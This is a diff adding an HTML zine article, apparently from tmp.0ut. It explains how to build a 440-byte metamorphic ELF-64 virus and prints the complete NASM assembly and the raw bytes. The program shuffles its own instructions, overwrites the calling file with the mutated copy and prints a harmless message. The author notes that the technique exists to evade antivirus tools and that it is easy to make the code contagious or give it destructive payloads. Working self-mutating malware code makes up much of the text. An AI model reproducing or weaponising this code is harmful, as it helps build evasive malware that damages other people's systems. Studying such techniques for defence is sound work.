@@ -1,0 +1,519 @@
+<html>
+<head>
+<title></title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./highlight.min.css">
+<script src="./highlight.min.js"></script>
+<script src="./x86asm.min.js"></script>
+</head>
+<body>
+<div class="txtdiv">
+01100001                                                              01100010
+01110010           │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │            01100101
+01110100         ┌─────────────────────────────────────────┐          00100000
+00100000       ──│ ┌─────────────────────────────────────┐ │──        01101001 
+01110011       ──│ │ A 440-BYTE METAMORPHIC ELF-64 VIRUS │ │──        01101100
+01101000       ──│ └─────────────────────────────────────┘ │──        01101100
+01101111         └─────────────────────────────────────────┘          01100101
+01110101           │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │            01100111
+01101100                                                     by ti3f  01100001
+01100100                                                  @proton.me  01101100
+
+After hitting my head in a bike accident, I recently wrote my first virus.
+Then I learned about metamorphic viruses and asked myself the question: How
+small can they get? Now I will describe a 440-byte metamorphic ELF-64 virus.
+Some terms can be negotiated here. What is a metamorphic virus? For our
+purposes, a virus will be a file that executes some payload. You know, disable
+the thermal controls and burn down the data center or something. Our virus
+will just print "tmp.0ut". Metamorphic viruses mutate upon execution, changing
+their form yet preserving their function. They evolved to avoid antiviruses.
+Their beauty is that, unlike self-encrypting (polymorphic) viruses, they never
+reveal their "true form" in memory---because they don't have one! Wonderful,
+but tricky to write. To keep things simple, we will take metamorphism to mean
+that a virus changes its binary form upon execution. Our virus will not
+spread, but simply mutate and deliver its payload. However, it is not
+difficult to make it contagious, strap bombs and knives to it and so on.
+                                        
+~~ IDEA ──────────────────────────────────────────────────────────────────────
+
+What's a minimal kind of metamorphism? Misunderstanding z0mbie [0] gave me an
+idea. We can write a virus in blocks and then permute the instructions within
+each block upon execution. The virus won't be the B-2 Spirit bomber of
+metamorphism, but it's simple and conforms to our sense of the word. We will
+consider instructions consisting of 4 bytes. Each block will contain 4
+instructions. Our virus will consist of 20 such blocks, together with a 120
+byte file header taking up a total of 120 + 20 * 4 * 4 = 440 bytes. Since each
+block can be permuted in 4! = 24 ways, our metamorphic virus can theoretically
+take up to 20 * 24 = 480 different forms. The difficulty will be using only
+4-or-less-byte x86-64 instructions and combining them in permutation invariant
+blocks. This is getting too abstract... Let's write the virus!
+
+~~ FUNCTION ──────────────────────────────────────────────────────────────────
+
+Since we're not doing anything hax0r, only system calls actually affect our
+virus's behavior. The high level structure of our virus with (syscalls) is
+
+Create a file (creat)
+Write headers to file (write)
+Write mutated code segment to file (write)
+Close file (close)
+Overwrite calling file (rename)
+Execute payload (write)
+Exit politely (exit)
+
+~~ FORM ──────────────────────────────────────────────────────────────────────
+
+Before anything else, we need a file header. Many interesting things have
+already been written about ELF-64 headers [1,2]. We keep it simple and clean
+with a single program header. The virus can be made shorter by hacking the
+headers, but our focus is the code segment, so let's not get distracted.
+
+Moving on to the code segment, we create an executable file with name "t",
+read from the stack. In assembly,
+<pre><code class="language-x86asm">
+mov rax, 85 ; creat
+mov rsi, 0x1ff ; file permissions 0755
+lea rdi, [rsp + 6] ; filename "t"
+mov [rsp + 6], "t" 
+mov [rsp + 7], 0x00 
+syscall ; create file
+mov rdi, rax ; save file descriptor
+</code></pre>
+Several problems already. The integer=&gt;register move instructions take up 5
+bytes, but our instructions should be 4 bytes. We can overcome with
+functionally equivalent bytes that use only the register's lower 16 bits:
+
+┌───────────────────────┐   ┌──────────────────────┐
+│ mov rax, 85 ; 5 bytes │   │ ; rax = 0            │     
+│                       │ ~ │ mov ax, 85 ; 4 bytes │
+│                       │   │                      │
+└───────────────────────┘   └──────────────────────┘
+
+This fucks up the program if the register's upper 58 bits are not zero, but it
+works so whatever. The integer=&gt;memory move instructions similarly use 5
+bytes, which we can get around by using a different register for indexing:
+
+┌──────────────────────────────┐   ┌──────────────────────────────┐
+│ mov [rsp + 6], "t" ; 5 bytes │   │ mov rdx, rsp       ; 3 bytes │             
+│                              │ ~ │ nop                ; 1 byte  │
+│                              │   │ mov [rbx + 6], "t" ; 4 bytes │
+└──────────────────────────────┘   └──────────────────────────────┘
+
+The register=&gt;register move instruction is only 3 bytes, so we pad it with a
+no-op. It must occur before the integer=&gt;memory instruction, i.e. belong to a
+prior block. Weaving instructions together and padding the blocks,
+
+┌─────────────────────┐   ┌─────────────────────┐
+│ mov rax, 85         │   │ mov ax, 85          │
+│ mov rsi, 0x1ff      │   │ mov si, 0x1ff       │
+│ lea rdi, [rsp + 6]  │   │ mov rbx, rsp        │
+│ mov [rsp + 6], "t"  │   │ nop                 │
+│ mov [rsp + 7], 0x00 │   │ nop4                │
+│ syscall             │   │                     │
+│ mov rdi, rax        │   │ lea rdi, [rbx + 6]  │
+│                     │   │ mov [rbx + 6], "t"  │
+│                     │   │ mov [rbx + 7], 0x00 │
+│                     │   │ nop4                │
+│                     │ ~ │                     │
+│                     │   │ syscall             │
+│                     │   │ nop2                │ 
+│                     │   │ nop4                │ 
+│                     │   │ nop4                │ 
+│                     │   │ nop4                │ 
+│                     │   │                     │ 
+│                     │   │ mov rdi, rax        │ 
+│                     │   │ nop                 │
+│                     │   │ nop4                │
+│                     │   │ nop4                │
+│                     │   │ nop4                │ 
+└─────────────────────┘   └─────────────────────┘
+
+That's the basic art. Blocks must do the same regardless of how instructions
+are ordered within them. Writing the headers to the file is the same, except 
+for a complication with saving the origin address to the rsi register. The 
+program crashes if we set origin to less than 65536, so let's keep that value. 
+Since we can only store 65535 with 16 bits, we can save the source address 
+using
+
+┌─────────────────────────────┐   ┌──────────────────────────────┐
+│ ; origin = 65536            │   │ ; rsi = 0                    │             
+│ lea rsi, [origin] ; 8 bytes │ ~ │ mov si, 65535      ; 4 bytes │
+│                             │   │ lea rsi, [rsi + 1] ; 4 bytes │
+└─────────────────────────────┘   └──────────────────────────────┘
+
+Time to write the mutated code segment to the file! The code segment consists
+of 20 16-byte blocks. In C, we could do something like
+<pre><code class="language-c">
+for (i = 0; i &lt; 320; i += 16) {
+  for (j = 3; j &gt;= 0; j--) {
+    ; code
+  }
+}
+</code></pre>
+The outer loop iterates over the blocks, and the inner loop writes the
+permuted instructions of each block. Loops are difficult, because we cannot
+use conditional jumps; jumps with relative addresses get screwed by shuffling,
+and jumps with absolute addresses use more than 4 bytes. Instead, we can use
+conditional moves and register jumps. The outer loop can be written as
+
+┌────────────────┐   ┌────────────────────────┐
+│ mov rbp, 0     │   │ ; r14 = continue       │
+│ loop:          │   │ ; r15 = loop           │
+│   ; code       │   │ xor rbp, rbp           │
+│                │   │ nop                    │
+│   add rbp, 16  │   │ nop4                   │
+│   cmp rbp, 320 │   │ nop4                   │
+│   jl loop      │   │ nop4                   │ 
+│                │   │                        │
+│                │   │ loop:                  │
+│                │   │   ; code               │
+│                │   │                        │
+│                │   │   add rbp, 16          │
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │ ~ │                        │
+│                │   │   cmp rbp, 320         │
+│                │   │   mov r8, r14          │
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │   │                        │
+│                │   │   cmovle r8, r15       │
+│                │   │   nop4                 │ 
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │   │                        │
+│                │   │   jmp r8               │
+│                │   │   nop                  │
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │   │   nop4                 │
+│                │   │ continue:              │
+└────────────────┘   └────────────────────────┘
+
+Loops consume many blocks, so we avoid the nested loop with the following
+equivalent logic, implementable with conditional moves:
+
+┌─────────────────────────────────┐   ┌────────────────────────────────────┐ 
+│ for (i = 0; i &lt; 320; i += 16) { │   │ for (i = 0, j = 3; i &lt; 320; j--) { │
+│   for (j = 3; j &gt;= 0; j--) {    │   │   ; code                           │
+│     ; code                      │   │   if (j &lt;= 0) {                    │
+│   }                             │ ~ │      i += 16;                      │
+│ }                               │   │      j = 4;                        │
+│                                 │   │   }                                │
+│                                 │   │ }                                  │
+└─────────────────────────────────┘   └────────────────────────────────────┘
+
+Now to write the permuted instruction inside the loop. Omitting the loop
+logic,
+<pre><code class="language-x86asm">
+; [rsp + 0] = 0
+; [rsp + 1] = 1
+; [rsp + 2] = 2
+; [rsp + 3] = 3
+; r12 = entry
+; rbp = i
+; rbx = j
+
+rtrand r13 ; random number generation
+lea rsi, [r12 + 4 * rbp]
+mov ax, 1 
+mov dx, 4
+
+and r13, rbx ; r13 = random(0, j)
+nop
+nop4
+nop4
+nop4
+
+mov r9b, byte [rsp + r13] ; permutation integer 
+mov r10b, byte [rsp + rbx]
+nop4
+nop4
+
+lea rsi, [rsi + 4 * r9] ; address of permuted instruction
+mov [rsp + rbx], r9b
+mov [rsp + r13], r10b
+nop4
+
+syscall ; write permuted instruction to file
+nop4
+nop4
+nop4
+</code></pre>
+The stack is prepared to hold the integers [0, 1, 2, 3]. Each loop iteration
+randomly samples an index from 0 to j. The integer with this index is used for
+writing and swapped with the jth integer on the stack. The next iteration
+samples an index from 0 to j - 1, such that integers are sampled without
+replacement. We maintain the source offset i at particular scale, so that we
+can do both comparisons and indexing with 4 byte instructions:
+
+┌──────────────────────────┐   ┌──────────────────────────┐
+│ lea rsi, [r12 + rbp]     │   │ lea rsi, [r12 + 4 * rbp] │
+│ cmp rbp, 320 ; 7 bytes   │ ~ │ cmp rbp, 80 ; 4 bytes    │
+│                          │   │                          │
+└──────────────────────────┘   └──────────────────────────┘
+
+Using the techniques already introduced, we then close and rename the file,
+execute the payload and exit.
+
+~~ TRICKS ────────────────────────────────────────────────────────────────────
+
+Now that the form is down, we start hacking to reduce the number of blocks:
+
+0. Weave the fuck out of instructions, respecting dependency chains and being
+   mindful that syscalls clobber rax, rcx and r11.
+
+1. Build the registers holding the origin (rsi), entry (r12), loop (r14) and
+   continue (r15) addresses together. Here we must use not instead of mov to 
+   save 65535 to the extended register r13 in 4 bytes:
+
+┌───────────────────────────┐   ┌────────────────────┐
+│ mov r13w, 65535 ; 5 bytes │   │ ; r13 = 0          │
+│                           │ ~ │ not r13w ; 4 bytes │
+│                           │   │                    │
+└───────────────────────────┘   └────────────────────┘
+
+2. Instead of zeroing registers and using mov (sometimes we must zero to avoid
+   the program crashing), use lea with a register whose value is known:
+
+┌──────────────┐   ┌──────────────────────┐
+│ xor rbx, rbx │   │ ; rdx = 120          │
+│ nop          │ ~ │ lea rbx, [rdx - 117] │
+│ mov bx, 3    │   │                      │
+└──────────────┘   └──────────────────────┘
+
+3. Arithmetic operations clobber the condition flag that cmp uses to
+   communicate with cmov, so we instead use lea:
+
+┌─────────┐   ┌────────────────────┐
+│ dec rbx │ ~ │ lea rbx, [rbx - 1] │
+└─────────┘   └────────────────────┘
+
+4. Copy the loop iterator j to both use and decrement it in a following block.
+
+5. Since the loop iterator i is never incremented upon initial entry into the
+   loop, we can set the register holding its incremented value at the end.
+
+6. Remove the random number generation instruction rtrand from the first loop
+   block and instead spam it the last block with the otherwise lonely jmp
+   instruction. Permutations are then random 75% of the time---good enough :)
+
+~~ CONCLUSION ────────────────────────────────────────────────────────────────
+
+Putting everything together, we have a 440 byte metamorphic virus! The
+assembly and bytes are given below. To visualize the mutating virus, run
+<pre><code class="language-sh">
+nasm -f bin virus.asm -o virus; chmod +x virus 
+watch -t -c -n 0.1 "xxd -R always virus; ./virus"
+</code></pre>
+Isn't it cute!!! The virus is trivial to detect with brute-force static
+analysis; it practically only has 16 * 24 + 1 * 12 + 3 * 4 = 408 forms, since
+some blocks contain repeated instructions. The number of forms can be
+increased factorially with larger block sizes, but the difficulty of writing
+such viruses similarly increases. I find it interesting that this metamorphic
+technique is enabled by a particular writing style, introducing restrictions
+that force creativity. While the virus itself is not especially useful, my
+hope is that some will find value in the techniques introduced or the
+questions raised. Massive thanks to the humans who create resources like
+tmp.0ut, Phrack and VXUG. As a concluding remark, I want to say fuck Google,
+Amazon, Meta, Microsoft, OpenAI, Anthropic, Anduril and Palantir.
+
+~~ virus.asm ─────────────────────────────────────────────────────────────────
+<pre><code class="language-x86asm">
+bits 64
+
+; multibyte no-ops
+%define nop2 db 0x66, 0x90 
+%define nop3 db 0x0f, 0x1f, 0x00
+%define nop4 db 0x0f, 0x1f, 0x40, 0x00
+
+%define origin 65536
+
+; elf header
+db 0x7f, "ELF"            ; e_ident
+db 2, 1, 1, 0             ; e_ident
+db 0, 0, 0, 0, 0, 0, 0, 0 ; e_ident
+dw 2                      ; e_type
+dw 0x3e                   ; e_machine
+dd 1                      ; e_version
+dq origin + header_size   ; e_entry
+dq 64                     ; e_phoff
+dq 0                      ; e_shoff
+dd 0                      ; e_flags
+dw 64                     ; e_ehsize
+dw 0x38                   ; e_phentsize
+dw 1                      ; e_phnum
+dw 0                      ; e_shentsize
+dw 0                      ; e_shnum
+dw 0                      ; e_shstrndx
+
+; program header
+dd 1                      ; p_type
+dd 5                      ; p_flags
+dq 0                      ; p_offset
+dq origin                 ; p_vaddr
+dq origin                 ; p_paddr
+dq file_size              ; p_filesz
+dq file_size              ; p_memsz
+dq 0                      ; p_align
+
+header_size: ; 120
+
+; code segment
+
+mov ax, 85 ; creat
+mov si, 0x1ff 
+mov rbx, rsp 
+nop
+mov [rsp], 0 
+
+mov [rbx + 6], "t"
+mov [rbx + 7], 0x00
+lea rdi, [rbx + 6] 
+not r13w ; r13 = 65535 = origin - 1
+
+syscall ; create file
+nop2
+mov dx, 120 ; header_size
+mov [rbx + 1], 1
+mov [rbx + 2], 2
+
+mov rdi, rax
+nop
+lea rsi, [r13 + 1] ; origin
+lea r14, [r13 + 127]
+mov [rbx + 3], 3
+
+mov ax, 1 ; write
+lea rbx, [rdx - 117] ; rbx = 3
+lea r12, [r13 + 121] ; entry
+add r14, 90 ; loop = 0xd8 = 216 = 127 + 89 
+
+syscall ; write headers to file
+nop2
+lea r15, [r14 + 95] ; continue = 0x138 = 312 = loop + 95
+rdrand r13
+nop4
+
+loop: ; 216
+  and r13, rbx ; r13 = random(0, j)
+  nop
+  lea rsi, [r12 + 4 * rbp] 
+  mov ax, 1 ; write
+  mov dx, 4
+  
+  cmp rbx, 0 
+  mov r9b, byte [rsp + r13]
+  mov r10b, byte [rsp + rbx]
+  mov r11, rbx
+  nop
+  
+  cmovle rbp, rcx ; rbp += 4 if rbx &lt;=0
+  cmovle rbx, rdx ; rbx = 4 if rbx &lt;= 0
+  lea rsi, [rsi + 4 * r9] 
+  mov [rsp + r11], r9b
+
+  syscall ; write permuted instruction to file
+  nop2
+  cmp rbp, 80 ; program_size / 4
+  mov r8, r14 ; loop
+  nop
+  nop4
+
+  cmovge r8, r15 ; r8 = continue if rbp * 4 &gt; program_size else loop
+  mov [rsp + r13], r10b
+  lea rcx, [rbp + 4] 
+  lea rbx, [rbx - 1] 
+
+  jmp r8
+  nop
+  rdrand r13
+  rdrand r13
+  rdrand r13
+continue: ; 312
+
+mov ax, 3 ; close
+mov rbx, rsp
+nop
+mov dx, 8 
+mov [rsp], "t"
+
+syscall ; close file
+nop2
+mov [rbx + 1], "m"
+mov [rbx + 2], "p"
+mov [rbx + 3], "."
+
+mov ax, 82 ; rename
+mov rsi, [rbx + 8] ; rsi = argv[0]
+lea rdi, [rbx + 6] ; rdi = "t"
+nop4
+
+syscall ; overwrite calling file
+nop2
+mov [rbx + 4], "0"
+mov [rbx + 5], "u"
+nop4
+
+mov ax, 1 ; write
+lea rdi, [rdx - 7] ; rdi = 1 = stdout
+mov rsi, rsp
+nop
+mov [rbx + 7], 0xa
+
+syscall ; execute payload
+nop2
+nop4
+nop4
+nop4
+
+mov ax, 60 ; exit 
+xor rdi, rdi
+nop
+nop4
+nop4
+
+syscall ; exit politely
+nop2
+nop4
+nop4
+nop4
+
+file_size: ; 440
+</code></pre>
+
+~~ virus ─────────────────────────────────────────────────────────────────────
+
+7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 78 00
+01 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+40 00 38 00 01 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 00 00 00 00 00 00
+00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00 00 00 b8 01 00 00 00 00 00 00
+b8 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 66 b8 55 00 66 be ff 01 48 89
+e3 90 c6 04 24 00 c6 43 06 74 c6 43 07 00 48 8d 7b 06 66 41 f7 d5 0f 05 66 90
+66 ba 78 00 c6 43 01 01 c6 43 02 02 48 89 c7 90 49 8d 75 01 4d 8d 75 7f c6 43
+03 03 66 b8 01 00 48 8d 5a 8b 4d 8d 65 79 49 83 c6 5a 0f 05 66 90 4d 8d 7e 5f
+49 0f c7 f5 0f 1f 40 00 49 21 dd 90 49 8d 34 ac 66 b8 01 00 66 ba 04 00 48 83
+fb 00 46 8a 0c 2c 44 8a 14 1c 49 89 db 90 48 0f 4e e9 48 0f 4e da 4a 8d 34 8e
+46 88 0c 1c 0f 05 66 90 48 83 fd 50 4d 89 f0 90 0f 1f 40 00 4d 0f 4d c7 46 88
+14 2c 48 8d 4d 04 48 8d 5b ff 41 ff e0 90 49 0f c7 f5 49 0f c7 f5 49 0f c7 f5
+66 b8 03 00 48 89 e3 90 66 ba 08 00 c6 04 24 74 0f 05 66 90 c6 43 01 6d c6 43
+02 70 c6 43 03 2e 66 b8 52 00 48 8b 73 08 48 8d 7b 06 0f 1f 40 00 0f 05 66 90
+c6 43 04 30 c6 43 05 75 0f 1f 40 00 66 b8 01 00 48 8d 7a f9 48 89 e6 90 c6 43
+07 0a 0f 05 66 90 0f 1f 40 00 0f 1f 40 00 0f 1f 40 00 66 b8 3c 00 48 31 ff 90
+0f 1f 40 00 0f 1f 40 00 0f 05 66 90 0f 1f 40 00 0f 1f 40 00 0f 1f 40 00 
+
+~~ REFERENCES ────────────────────────────────────────────────────────────────
+
+[0] http://z0mbie.daemonlab.org/meta2_e.txt
+[1] https://n0.lol/ebm/
+[2] https://tmpout.sh/1/1.html 
+
+</code></pre>
+
+--[ <a href="3.html">PREV</a> | <a href="index.html">HOME</a> | <a href="5.html">NEXT</a> ]--
+
+</div>
+<script>hljs.highlightAll();</script>
+</body>
